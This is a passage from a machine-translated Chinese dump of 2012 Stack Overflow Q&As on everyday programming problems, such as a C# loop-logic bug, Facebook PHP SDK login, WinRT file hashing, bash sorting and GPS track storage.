urlPath[3] = "/Images/nameOfPic3.jpg"; 
```

然后通过抓取日期循环浏览它们：

```
var myDate = new Date(); 
```

然后根据 getDate() 获取图像的路径：

```
var currentDate = myDate.getDate();
document.getElementById("imgElement").src=urlPath[currentDate]; 
```

然后（取决于给定月份的照片数量）您可以根据数字日期分配新照片。当然，使用此示例，将图片数量等于一个月中的最大天数 (31) 以便根据需要调用它们是有意义的。这种方式会在某些月份（但是少于 31 天的月份）遗漏某些图片。如果您想简单地循环浏览它们，则完全按照上面的方法进行操作，但添加此语句而不是最后两个语句（此示例假设您始终有 25 张图片）：

```
var currentDate = myDate.getDate();
if(currentDate > 25)
{
    currentDate -= 25;
    document.getElementById("imgElement").src=urlPath[currentDate];
}
else
{
    document.getElementById("imgElement").src=urlPath[currentDate];
} 
```

这并不完全完美，因为每个新月的开始都会重新开始图片列表，并且有些图片会比其他图片更多。我不确定是否有更好的方法来做到这一点，但如果您的客户不太挑剔，它应该可以完成工作。不过，我个人还是会使用服务器端代码并​​设置一个全局的应用程序变量（适用于所有人），并直接处理它并记住 AppState 变量（很明显我使用的是 WebMatrix (C#) 吗？）无论客户端的情况如何。

我希望这有帮助 ：）

# php - facebook 应用程序代码失败 getUser 返回 NULL

> ID：13418035
> 
> 赞同：0
> 
> 时间：2012-11-16T13:55:55.260
> 
> 标签：php, facebook

我正在尝试学习 facebook 应用程序开发，这是我正在尝试的代码。

```
<?php
require_once 'config.php';

/* Get a valid session */
$session = $facebook->getUser();
$me = null;
if($session) {
/* Check if session is valid */
$me = $facebook->api('/me');
}

var_dump($me);
?> 
```

我已经在 config.php 中设置了我的应用程序 ID 和密码，但它无法执行 getUser()，它返回的所有内容都是空的。

在这里检查。

[http://facebookdevelop.byethost8.com/index.php](http://facebookdevelop.byethost8.com/index.php)

除了在托管站点中复制 facebook php sdk 之外，我是否需要进行特殊设置？有没有一个地方可以提供最新信息，清楚地定义分步说明？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:27:30.650

没有用户登录/授权，您不能只获取用户 ID。

见这里：[https ://developers.facebook.com/docs/reference/php/](https://developers.facebook.com/docs/reference/php/)

Facebook 文档并没有很多人想象的那么糟糕。另一个基础教程：

[https://github.com/facebook/facebook-php-sdk](https://github.com/facebook/facebook-php-sdk)

请参阅“getLoginUrl”。获取最新的 php sdk 并使用 git 页面上“Usage”中的代码。“getUser”不返回会话，它返回一个用户 ID（如果用户未登录，则返回任何内容/零）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:55:33.120

此代码有效

```
<?php

/**
 * This sample app is provided to kickstart your experience using Facebook's
 * resources for developers.  This sample app provides examples of several
 * key concepts, including authentication, the Graph API, and FQL (Facebook
 * Query Language). Please visit the docs at 'developers.facebook.com/docs'
 * to learn more about the resources available to you
 */

// Provides access to app specific values such as your app id and app secret.
// Defined in 'AppInfo.php'
require_once('AppInfo.php');

// Enforce https on production
if (substr(AppInfo::getUrl(), 0, 8) != 'https://' && $_SERVER['REMOTE_ADDR'] != '127.0.0.1') {
  header('Location: https://'. $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
  exit();
}

// This provides access to helper functions defined in 'utils.php'
require_once('utils.php');

/*****************************************************************************
 *
 * The content below provides examples of how to fetch Facebook data using the
 * Graph API and FQL.  It uses the helper functions defined in 'utils.php' to
 * do so.  You should change this section so that it prepares all of the
 * information that you want to display to the user.
 *
 ****************************************************************************/

require_once('sdk/src/facebook.php');

$facebook = new Facebook(array(
  'appId'  => AppInfo::appID(),
  'secret' => AppInfo::appSecret(),
  'sharedSession' => true,
  'trustForwarded' => true,
));

$user_id = $facebook->getUser();
if ($user_id) {
  try {
    // Fetch the viewer's basic information
    $basic = $facebook->api('/me');
  } catch (FacebookApiException $e) {
    // If the call fails we check if we still have a user. The user will be
    // cleared if the error is because of an invalid accesstoken
    if (!$facebook->getUser()) {
      header('Location: '. AppInfo::getUrl($_SERVER['REQUEST_URI']));
      exit();
    }
  }
  // This fetches some things that you like . 'limit=*" only returns * values.
  // To see the format of the data you are retrieving, use the "Graph API
  // Explorer" which is at https://developers.facebook.com/tools/explorer/
  $likes = idx($facebook->api('/me/likes?limit=4'), 'data', array());

  // This fetches 4 of your friends.
  $friends = idx($facebook->api('/me/friends?limit=4'), 'data', array());

  // And this returns 16 of your photos.
  $photos = idx($facebook->api('/me/photos?limit=16'), 'data', array());

  // Here is an example of a FQL call that fetches all of your friends that are
  // using this app
  $app_using_friends = $facebook->api(array(
  'method' => 'fql.query',
        'query' => 'SELECT uid, name FROM user WHERE uid IN(SELECT uid2 FROM friend WHERE uid1 = me()) AND is_app_user = 1'
  ));
}

var_dump ($user_id);
?> 
```

只需要弄清楚区别。

# c# - Windows 8 中的文件 IO

> ID：13418037
> 
> 赞同：4
> 
> 时间：2012-11-16T13:56:05.840
> 
> 标签：c#, file-io, windows-8, microsoft-metro, storage

我一直在尝试读取文件，并计算内容的哈希以查找重复项。问题是 in `Windows 8`（或`WinRT`或 windows 商店应用程序，或者无论如何调用它，我完全感到困惑），`System.IO`已被替换为`Windows.Storage`，它的行为不同，并且非常混乱。官方文档根本没用。

首先，我需要获取一个 StorageFile 对象，在我的例子中，我是通过从文件选择器浏览文件夹获得的：

```
var picker = new Windows.Storage.Pickers.FolderPicker();
picker.SuggestedStartLocation = Windows.Storage.Pickers.PickerLocationId.MusicLibrary;
picker.FileTypeFilter.Add("*");
var folder = await picker.PickSingleFolderAsync();
var files = await folder.GetFilesAsync(Windows.Storage.Search.CommonFileQuery.OrderByName); 
```

现在在文件中，我有我需要索引的文件列表。接下来，我需要打开该文件：

```
foreach (StorageFile file in files)
{
    var filestream = file.OpenAsync(Windows.Storage.FileAccessMode.Read); 
```

现在是最令人困惑的部分：从文件中获取数据。文档没用，我找不到任何代码示例。显然，微软认为从相机获取照片比打开文件更重要。

文件流有一个`ReadAsync`我认为读取数据的成员。此方法需要一个缓冲区作为参数并返回另一个缓冲区 (???)。所以我创建了一个缓冲区：

```
 var buffer = new Windows.Storage.Streams.Buffer(1024 * 1024 * 10); // 10 mb should be enough for an mp3
    var resultbuffer = await filestream.ReadAsync(buffer, 1024 * 1024 * 10, Windows.Storage.Streams.InputStreamOptions.ReadAhead); 
```

我想知道......如果文件没有足够的字节会发生什么？我没有在文档中看到任何信息。

现在我需要计算这个文件的哈希值。为此，我需要创建一个算法对象...

```
 var alg = Windows.Security.Criptography.Core.HashAlgorithmProvider.OpenAlgorithm("md5");
    var hashbuff = alg.HashData(resultbuffer);

    // Cleanup
    filestream.Dispose(); 
```

我也考虑过分块读取文件，但我怎样才能计算出这样的哈希值呢？我在文档中到处查看，并没有发现任何关于此的内容。它可能是带有“附加”方法的 CryptographicHash 类类型吗？

现在我有另一个问题。如何从那个奇怪的缓冲区中获取数据到字节数组？IBuffer 类没有任何“GetData”成员，并且该文档再次无用。

所以我现在能做的就是想知道宇宙的奥秘……

```
 // ???
} 
```

所以问题是......我该怎么做？我完全糊涂了，我想知道为什么微软选择让读取文件如此……如此……如此……不可能！即使在组装中，我也可以比......这件事更容易理解。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:03:27.617

WinRT 或 Windows 运行时不应与 .NET 混淆，因为它不是 .NET。WinRT 只能访问 Win32 API 的子集，但不能访问 .NET 之类的所有内容。这是一篇很好的文章，介绍了 WinRT 中的[规则和限制](http://en.wikipedia.org/wiki/Windows_Runtime#Restrictions_and_rules)。

WinRT 通常无权访问文件系统。它适用于*功能*，您可以允许*文件访问功能*，但这将限制您的应用程序仅访问某些区域。[这](http://www.codeproject.com/Articles/432876/Windows-8-The-Right-Way-to-Read-Write-Files-in-Win)是如何通过 WinRT 进行文件访问的一个很好的示例。

# robotics - 机器人操作系统ROS书

> ID：13418038
> 
> 赞同：0
> 
> 时间：2012-11-16T13:56:09.673
> 
> 标签：robotics, robot, ros

我需要一本书来学习**ROS**架构的基础知识。有谁知道介绍的好书吗？

此致...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-19T17:14:59.597

**DISCLAIMER**: I am the author of the following book:

*ROS By Example* - [http://www.lulu.com/spotlight/pirobot](http://www.lulu.com/spotlight/pirobot)

Available for ROS Electric (print and PDF versions) and Fuerte (PDF).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:02:15.977

*   [ROS：开源机器人操作系统](http://www.robotics.stanford.edu/~ang/papers/icraoss09-ROS.pdf)，斯坦福大学电子书
*   [ROS 简介](http://www.cse.sc.edu/~jokane/agitr/)

# php - $statement->execute 的 PHP 内部服务器错误

> ID：13418040
> 
> 赞同：0
> 
> 时间：2012-11-16T13:56:13.767
> 
> 标签：php, error-handling, mysqli, prepared-statement, internal-server-error

因此，我将 PHP 与 Mysqli 一起使用，并尝试运行一个非常基本的准备好的语句：

```
$stmt = $mysqli->prepare("SELECT field FROM blubb WHERE id=? AND username=? LIMIT 1");

while($doingStuff){
  // Do Stuff
  $stmt->bind_param("is", $id, $username);
  $stmt->execute();
  // Do Stuff
} 
```

但是当我尝试运行执行时出现内部服务器错误。

我已经设置

```
error_reporting(E_ALL);
ini_set("display_errors", 1); 
```

在我的脚本中，我认为我可能会收到一条错误消息以了解问题所在，但它仍然是内部服务器错误。

我也试过

```
$stmt->execute() or die("error msg"); 
```

但仍然是相同的错误，服务器错误日志中也没有任何内容。我还尝试过将 $id 显式转换为 int，但没有帮助。

我怎样才能调试它并找到错误？我似乎无法从我的脚本中得到正确的错误消息，而且我不知道可能出了什么问题，因为我使用的其他准备好的语句运行良好。

编辑：好的，我刚刚找到了问题的根源，我正在尝试这样做

```
while($doStuff){
  method($stmt1, $stmt2)
}
method($stmt1, $stmt2){
  // handle $stmt1
  // stuff
  // handle $stmt2
} 
```

[根据这篇文章http://www.ioncannon.net/programming/889/php-mysqli-and-multiple-prepared-statements/](http://www.ioncannon.net/programming/889/php-mysqli-and-multiple-prepared-statements/)这是不可能的

我通过简单地改变来修复错误

```
while($doingStuff){
  // Do Stuff
  $stmt->bind_param("is", $id, $username);
  $stmt->execute();
  // Do Stuff
} 
```

至

```
while($doingStuff){
  // Do Stuff
  $stmt->bind_param("is", $id, $username);
  $stmt->execute();
  $stmt->store_result();
  // Do Stuff
} 
```

在第一个声明上。

但是我仍然想知道如何获取实际错误而不是内部服务器错误，因为我使用的是共享主机，所以我无法更改 php.ini

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T13:59:28.313

尝试在 PHP 配置中设置[display_errors](http://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors)、[log_errors](http://www.php.net/manual/en/errorfunc.configuration.php#ini.log-errors)和[error_log](http://www.php.net/manual/en/errorfunc.configuration.php#ini.error-log)指令，而不是从脚本中：php.ini 或者，如果允许和支持，.htaccess。

# c++ - 解码图像文件的框架

> ID：13418049
> 
> 赞同：0
> 
> 时间：2012-11-16T13:56:55.823
> 
> 标签：c++, c, image, frameworks, codec

我需要一些框架/库/编解码器包来解码各种格式的图像文件（如 DirectShow 或用于音频/视频的 libvlc）。我更喜欢可移植的开源 C/C++ 项目。你有什么建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:51:51.053

也许您可以尝试使用 OpenCv [http://opencv.willowgarage.com/wiki/](http://opencv.willowgarage.com/wiki/)

[http://opencv.willowgarage.com/documentation/cpp/highgui_reading_and_writing_images_and_video.html](http://opencv.willowgarage.com/documentation/cpp/highgui_reading_and_writing_images_and_video.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-16T13:58:04.880

例如，您可以看看[SDL_image](http://www.libsdl.org/projects/SDL_image/)。

# loops - 为什么这会永远循环？

> ID：13418052
> 
> 赞同：0
> 
> 时间：2012-11-16T13:57:21.033
> 
> 标签：loops

```
string confirm = "";

                    while (confirm != "y" || confirm != "n")
                    {
                        Console.Write("Remove {0}' account? (Y/N): ", Accounts[accountNumber].Name);
                        confirm = Console.ReadLine();
                        confirm = confirm.ToLower();
                    } 
```

由于某些未知原因，我的循环在检查中失败。即使确认是“n”或“y”，它仍然会再次循环。我什至通过使用断点检查了它是否绝对匹配“n”或“y”。那么为什么每次都没有通过检查呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T13:59:11.013

```
while (confirm != "y" || confirm != "n") 
```

您将在您的字符串为NOT*或*`y`NOT时循环`n`。如果是`n`，那么它不是`y`，反之亦然。你不能同时满足这两个条件！

你需要

```
 while (confirm != "y" && confirm != "n") 
```

如果您的字符串不是`y`or ，这将得到满足`n`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:00:07.900

因为你的字符串不能同时是`y`and `n`。替换`||`为`&&`：

```
while (confirm != "y" && confirm != "n") 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:00:28.070

这是一个错误的逻辑：例如，如果确认是“y”，它不等于“n”，所以它无论如何都会进入你的循环。

做这个：

```
while (!(confirm == "y" || confirm =="n")){
...
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-16T14:08:04.533

奥斯特勒博士，

你的逻辑是错误的。

对我来说，如果您以二进制方式思考，ir 会有所帮助。

0 OR 0 是唯一的假，而 0 OR 1、1 OR 1、1 OR 0 都是真。0 OR 0 表示你的 or 答案必须是 y 和 n，这是不可能的。

您需要的是使用 AND 运算符 (&&) 或使用相等而不是否定。

```
while (confirm != "y" && confirm != "n") 
```

只要有一个既不是y也不是n的答案，这只会循环。

或者

```
while (confirm == "y" || confirm == "n") 
```

仅当答案是 y 或 n 时才会循环。

提示：谷歌摩根法律！

# android - 移动设备无法连接到我电脑中的网络服务器

> ID：13418054
> 
> 赞同：0
> 
> 时间：2012-11-16T13:57:35.707
> 
> 标签：android, connect

我正在开发一个连接到 Web 服务器以获取信息的 android 应用程序。我正在使用 HTTP 客户端库与 Web 服务器连接。

我有两种情况：

1.  模拟器和 Web 服务器都安装在同一台 PC 上。该应用程序运行完美。

2.  Android mobile (Xperia P) 通过 USB 线与我的 PC 连接，并在我的 PC 中安装了网络服务器。

在第二种情况下，应用程序无法与 Web 服务器连接。

如果我禁用了 3G，则会收到“网络无法访问”错误消息。

如果我启用了 3G，则会收到“java.net.SocketException: recvfrom failed: ECONNRESET (Connection reset by peer)”错误消息。

因此，我想在真实设备中测试我的应用程序，并且该应用程序需要与安装在我的 PC 中的 Web 服务器连接。

我怎么能对 android devive 显示 web 服务器？我想在我的电脑网络中安装移动设备。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:10:18.227

试试下面的。确保手机的wifi是打开的，并且手机和你的开发机器连接到同一个网络。

现在，在调用 web 服务时，不要使用“localhost”或“127.0.0.1”，而是使用机器的 IP 地址（例如由 DHCP 分配）。

希望这可以帮助。

此致，

安奈

# iframe - 使用 selenium 访问多个滚动条

> ID：13418055
> 
> 赞同：1
> 
> 时间：2012-11-16T13:57:37.547
> 
> 标签：iframe, selenium, scrollbar

如何对 iFrame 中的滚动条执行操作？

问题一：

我需要单击 iFrame 中存在的链接，该链接在滚动垂直条时显示。但是当我尝试单击链接时，Selenium 2.0 无法找到该元素并且它正在滚动网页滚动条。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T06:35:23.337

我认为解决它的最佳方法是通过 javascript 使您的链接可见（将隐藏属性更改为可见）。

无论如何，您是否尝试使用 sendKeys 发送空格键？如果您已经在 iframe 上，它将向下滚动

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-24T10:36:28.970

我用它来单击元素 - 没有看到它（也在 iframe 中）。当我尝试滚动或 element.click() 时，iframe 滚动条坏了，测试无法继续。

如果这样找不到，也试试用js找。

```
WebElement element = getWebDriver().findElement(By.id("element_id"))

JavascriptExecutor jse = (JavascriptExecutor) getWebDriver();
jse.executeScript("arguments[0].click();", element); 
```

# objective-c - 用 iOS 5 书学习 iOS 编程可以吗？

> ID：13418062
> 
> 赞同：-4
> 
> 时间：2012-11-16T13:58:02.773
> 
> 标签：objective-c, ios, ios5, ios6

我最近在学习一些 iOS 开发，但我是从一本 iOS 5 的书中学习的，因为它写得很好，很受欢迎，而且我还找不到很多 iOS 6 的书。

然而，随着 iOS 6 的发布，学习 iOS 5 的书是否明智？我知道 iOS 4 到 iOS 5 在 API 方面是一个巨大的飞跃，引入了 ARC 等等。对于 iOS 5 - iOS 6，这不是一回事，是吗？

如果我从一本 iOS 5 书籍中学习，我会错过 iOS 6 中引入的一些真正激进的变化吗？或者我可能会没事？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:05:01.207

API 没有那么激进的变化，这是真的。[Auto-Layout](https://developer.apple.com/library/ios/#documentation/UserExperience/Conceptual/AutolayoutPG/Articles/Introduction.html#//apple_ref/doc/uid/TP40010853)它可能是最大的变化。其余的是您可以稍后查看的附加功能，例如 Pass Kit、Reminders API、UICollectionView 或更好的社交集成。

我不会太担心 iOS 5 的书会过时，如果它很好的话。确保它教 ARC 并且不要花太多时间学习自动调整蒙版（不是说它会很复杂，但 Auto-Layout 现在是更好的选择）。

# git - 在 git 上管理更直接连接的项目

> ID：13418064
> 
> 赞同：3
> 
> 时间：2012-11-16T13:58:12.803
> 
> 标签：git, github

如果我提出重复的问题，首先让我道歉，因为有非常相似的问题，但没有一个能解决我的担忧。

我有 3 个“耦合”的项目，这意味着对一个项目的更改会影响另一个项目。它们中的每一个都作为单独的 git 项目托管在 github 上。项目有：

*   服务器（... foo/server.git）
*   cli 客户端 (... foo/cli-client.git)
*   网络客户端（... foo/web-client.git）

我需要功能分支、发布分支、修补程序分支和一般发布软件。

显然，web/cli 客户端上的更改与服务器上的更改相结合，当我需要分支时，我需要在每个项目上创建分支（分支通常在原点完成，以便整个团队可以协作）。在我需要合并回主人等之后......

我想避免这种情况，并拥有允许我同时分支版本的机制。对此的明显答案是创建父项目，它将每个项目作为一个子文件夹，并最终将父项目保留在一个 git repo 上。

我的问题是这样做有什么缺点？方法似乎有点天真，我想知道有没有更好的方法来实现这一目标？我正在调查，`git submodules`但似乎他们提供*下游*并且不允许*上游*，这将允许我在所有项目中分支和合并。（也许我错了）。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T22:51:13.220

子模块存在一些[问题](http://git-scm.com/book/en/Git-Tools-Submodules#Issues-with-Submodules)。此外，这不是 git 中创建子模块功能的目的，我建议不要在您的情况下使用它。

您有 3 个彼此松散相关的项目，而不是三个存储库中的一个项目。客户端应用程序正在使用服务器，而 Web 应用程序正在使用服务器。有时，但并非总是如此，一个项目上的分支名称与另一个项目中的名称相同，但从 git 的角度来看，这纯属巧合。

我见过许多具有类似工作环境的开发团队，他们都在其中使用了单独的存储库和单独的分支。通常，给定主题的工作在另一个项目开始前几天或几周就完成了（或者根本不需要更改另一个项目）。

但是，如果您觉得需要自动化这个过程，您可以编写一个简单的 shell 脚本“create-branch-on-all-projects.sh”和“merge-branch-on-all-projects.sh”。

# mysql - 在服务器上存储 GPS 坐标（轨迹）的最佳方式

> ID：13418066
> 
> 赞同：5
> 
> 时间：2012-11-16T13:58:14.293
> 
> 标签：mysql, oracle, gps, coordinates, coordinate-systems

在服务器（MySQL 或 Oracle 或任何文件中）存储 GPS 坐标（轨迹）的最佳方式是什么？例如，它是如何在 GoogleMaps 中实现的？我想保存和比较相同部分的曲目。

PS我有所有必要的数据。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-16T14:30:58.643

如果我是你，我会使用 TRACK 和 POINT 表。

TRACK 表将为每个不同的轨道包含一行

```
 TRACK_ID      int not null  (PK)
  NAME          varchar(40)
  DESCRIPTION   varchar(255)
  other identifying information 
```

POINT 表将包含每个轨道的多行，轨道中的每个点一个

```
 POINT_ID     int not null  (PK)
  TRACK_ID     int not null  (FK to TRACK)
  LAT          float  degrees  .. positive means north
  LONG         float  degrees  .. positive means east, negative means west
  ALT          float (elevation if you have it)
  TS           timestamp of point 
```

关于这一点的几点说明。保持 POINT 表的行短；你会有很多，你希望能够快速地处理它们。另外，不要屈服于使用 double 而不是 float 的诱惑；浮点数据格式对于典型点具有足够的精度（除非您是土地测量员并且了解诸如通用横向墨卡托投影之类的东西）。

# bash - 如何根据文件的一列在bash中对文件进行排序

> ID：13418067
> 
> 赞同：1
> 
> 时间：2012-11-16T13:58:14.257
> 
> 标签：bash, sorting

我有一个由 5 列组成的文本文件，我想根据文件的第四列对每一行进行排序，知道吗？

我在下面放了几行文件以使其更清楚。

```
0 27000000 spk1 -5865.438965
0 27000000 spk10 -6069.150879
0 27000000 spk6 -6070.252930
0 27000000 spk17 -6211.137695
0 27000000 spk12 -6256.836426
0 27000000 spk7 -6259.441895
0 27000000 spk16 -6307.564453 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T14:05:54.757

像这样？

```
$ sort -n -t ' ' -k 4 test.txt
0 27000000 spk16 -6307.564453
0 27000000 spk7 -6259.441895
0 27000000 spk12 -6256.836426
0 27000000 spk17 -6211.137695
0 27000000 spk6 -6070.252930
0 27000000 spk10 -6069.150879
0 27000000 spk1 -5865.438965 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:07:08.623

您可以使用排序命令并定义字段以根据它和字段分隔符进行排序，如下所示

```
sort -t" " -k4 filename 
```

# android - 项目标题未以 SHOW_AS_ACTION_WITH_TEXT 纵向显示

> ID：13418068
> 
> 赞同：4
> 
> 时间：2012-11-16T13:58:16.647
> 
> 标签：android, android-actionbar, android-contextmenu

在我的活动中，我有一个带有标题和图标的单个项目的操作模式。

我希望同时显示标题和图标，因此我使用 SHOW_AS_ACTION_WITH_TEXT 和 SHOW_AS_ACTION_ALWAYS 标志。

在横向方向，它很好。我有标题+图标。但是在纵向时只显示图标（尽管有很多可用空间）。有谁知道我能做些什么来解决它？

请注意，如果我删除图标，标题会正确显示。

这是我的示例代码：

```
public class TestActivity extends Activity {

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    startActionMode(new Callback() {

        @Override
        public boolean onCreateActionMode(ActionMode mode, Menu menu) {
            menu.add("Item 1").setIcon(R.drawable.ic_launcher).setShowAsAction(MenuItem.SHOW_AS_ACTION_WITH_TEXT | MenuItem.SHOW_AS_ACTION_ALWAYS);
            return true;
        }

        @Override
        public boolean onPrepareActionMode(ActionMode mode, Menu menu) { return false; }

        @Override
        public void onDestroyActionMode(ActionMode mode) { }

        @Override
        public boolean onActionItemClicked(ActionMode mode, MenuItem item) { return false; }
    });
}
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T16:43:05.257

> 有谁知道我能做些什么来解决它？

我怀疑你可以。“总是”和“带文本”是请求，而不是命令。该框架并不总是尊重其中任何一个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:12:23.820

尝试使用此属性，而不是通过代码添加此菜单项：

```
android:showAsAction="always|withText" 
```

并将其添加到 menu.xml 中的项目中

# java - 获取 Cloud Storage (Java) 中的文件列表

> ID：13418076
> 
> 赞同：10
> 
> 时间：2012-11-16T13:58:49.823
> 
> 标签：java, google-app-engine, google-cloud-storage

是否有可能使用 GAE SDK 列出我的 Google Cloud Storage 存储桶中的所有文件？我知道 Python SDK 支持这样的功能，但是我在 Java SDK 中找不到类似的功能。

如果不可用，是否会在 Java SDK 的未来版本中添加？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2014-09-17T11:30:07.243

您也可以使用[Google Java Client Library](https://code.google.com/p/google-api-java-client/)（它正在替换[Google Cloud Storage API](https://developers.google.com/appengine/docs/java/googlestorage/)）来执行此操作

```
GcsService gcsService = GcsServiceFactory.createGcsService(RetryParams.getDefaultInstance());
AppIdentityService appIdentity = AppIdentityServiceFactory.getAppIdentityService();

ListResult result = gcsService.list(appIdentity.getDefaultGcsBucketName(), ListOptions.DEFAULT);
while (result.hasNext()){
    ListItem l = result.next();
    String name = l.getName();

    System.out.println("Name: " + name);
} 
```

如果您只想遍历某个“目录”，请使用 ListOptions 构建器

```
ListOptions.Builder b = new ListOptions.Builder();
b.setRecursive(true);
b.setPrefix("directory");
...

ListResult result = gcsService.list(appIdentity.getDefaultGcsBucketName(), b.build());
... 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-16T15:44:08.297

您可以通过其[客户端库](https://code.google.com/p/google-api-java-client/wiki/APIs#Cloud_Storage_API)使用 Cloud Storage JSON API 。设置凭据后，您可以像这样拨打电话：

```
Storage storage = new Storage(httpTransport, jsonFactory, credential);
ObjectsList list = storage.objects().list("bucket-name").execute();
for (Object obj : list.getItems()) {
  //...
} 
```

在这种情况下，您可能还想使用 an `AppIdentityCredential`，这将允许存储桶由您的应用程序拥有，而不是由用户拥有。

# plone - 为敏捷内容类型隐藏没有内容的字段

> ID：13418077
> 
> 赞同：1
> 
> 时间：2012-11-16T13:58:52.747
> 
> 标签：plone, dexterity

我用Dexterity创建了一个内容类型，添加一个项目后，在首页，没有内容的字段仍然显示在详细信息页面中。

我想隐藏这些字段及其标题，我该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:31:25.570

您可以使用[显示表单](http://plone.org/products/dexterity/documentation/manual/developer-manual/custom-views/display-forms)自定义敏捷类型的视图。

这是一个`z3c.form`表单，因此我们可以使用该`.updateWidgets()`方法来动态设置小部件可用性以[隐藏其中一些](http://developer.plone.org/forms/z3c.form.html#hiding-fields)：

```
import z3c.form
from plone.directives import dexterity

class MyCustomView(dexterity.DisplayForm):
    grok.context(IMyContentType)
    grok.require('zope2.View')

    def updateWidgets(self):
        super(MyCustomView, self).updateWidgets()
        for widget in self.widgets.values():
            if not widget.value:
                widget.mode = z3c.form.interfaces.HIDDEN_MODE 
```

# slideshow - Wowslider 与 Lightbox (Slimbox2) 插件冲突

> ID：13418080
> 
> 赞同：2
> 
> 时间：2012-11-16T13:59:00.297
> 
> 标签：slideshow, lightbox, carousel, conflict

我正在使用两个插件，Wowslider 和 Slimbox2，一起创建一个临时相册。这两个脚本是冲突的，并且 Slimbox 插件仅适用于第一个页面加载时的第一个专辑链接。一旦我开始与 wowslider 缩略图交互以导航到相册并单击它们的链接，Slimbox 就会中断。

我觉得这与 JS 和重新扫描页面有关，但是我不是 JS 专家。我使用插件并在需要时实现它们。通常我很擅长弄清楚这些事情，但在这种情况下，这超出了我的经验范围。我已经完成了我的研究并试图解决这个问题，但没有运气。

这是画廊正在开发的 URL。当您在第一页加载后尝试与相册进行交互时，您会明白我的意思。

[http://www.vetshouse.org/vth_root/community_photoGallery.html](http://www.vetshouse.org/vth_root/community_photoGallery.html)

我很确定我的代码很好，因为它确实适用于第一页加载时的第一个专辑链接。这就是为什么我认为它是冲突的脚本。

我还尝试在 wowslider 脚本之前和之后加载 Slimbox2.js，但没有任何效果。

# android - BitmapFactory.decodeStream()中的Android重用流

> ID：13418081
> 
> 赞同：1
> 
> 时间：2012-11-16T13:59:01.583
> 
> 标签：android, memory-management, bitmap, stream

我们需要对从 InputStream 接收到的图像进行下采样。它是从某个 URL 接收到的图像，它可以很小也可以很大。为了将这张图片放入内存中，我们必须对其进行下采样。首先，我们借助`inJustDecodeBounds`并计算必要的样本来检索图像大小。然后我们通过在 中指定这个样本来创建下采样位图`BitmapFactory.Options.inSampleSize`。这种两步解码需要两次调用，`decodeStream()`并且工作正常。

这适用于 SD 卡中的文件。但在我们的例子中，输入流不能被重置，所以我们不能调用`decodeStream()`两次。克隆输入流也不是一种选择，因为它的尺寸很大。或者，我们可以向同一个 URL 创建 2 个 HTTP 请求：首先获取图像大小，然后通过下采样解码实际图像，但这种解决方案似乎相当难看。

我们可以重用无法重置的流吗？或者请为此问题提出一些已知的解决方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:09:54.010

如果您不想重用流，显然必须将其保存到 RAM 或 SD 卡，因为网络 InputStream（假设它不是缓冲的）没有保存下载的数据。

因此，如前所述解决此问题的选项是将图像直接保存到 sd 卡（可能在某个[临时](https://stackoverflow.com/questions/3425906/creating-temporary-files-in-android)目录中），如果图像真的很大的话。

# javascript - 从某些JS打开Windows资源管理器时如何设置默认驱动器/文件夹

> ID：13418083
> 
> 赞同：2
> 
> 时间：2012-11-16T13:59:02.850
> 
> 标签：javascript, jsp

JS 打开 Windows 资源管理器，让用户选择一个文件，然后打开该文件。我想默认它每次都在同一个文件夹中查找。

```
<html>
<head>
<script type="text/javascript">
function getFilename()
{
<!-- open the file -->
var thefile = document.getElementById('thefile');
window.open(thefile.value,'mywindow','width=400,height=200')
}
</script>
</head>
<body>
<form>  
<!-- get the filename -->               
<p>FCT scanned files search screen</P>
<p>Click Browse to select file</P>
<input type="file" id="thefile" onchange="getFilename()" />
</form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:53:03.660

您正在寻找的东西是不可能的（至少在 IE 中）。出于安全原因，您无法使用文件输入字段更改任何内容。您甚至无法通过脚本更改输入字段的值（只能通过对话窗口）。

您可以通过破解 Windows 注册表中的某些内容来为您自己的浏览器执行此操作，但我完全不确定。

格。瑞克

# python - 正则表达式从给定类型的字符串中获取多个日期

> ID：13418084
> 
> 赞同：4
> 
> 时间：2012-11-16T13:59:08.293
> 
> 标签：python, regex

我的**Python**程序中有这样的字符串，并按要求添加了想要的结果：

```
"Sat 1 Dec - 11h + 14h / Sun 2 Dec - 12h30"
("Sat 1 Dec 11h", "Sat 1 Dec 14h", "Sun 2 Dec 12h30")
"Tue 27 + Wed 28 Nov - 20h30"
("Tue 27 Nov 20h30", "Wed 28 Nov 20h30")
"Fri 4 + Sat 5 Jan - 20h30"
("Fri 4 Jan 20h30", "Sat 5 Jan 20h30")
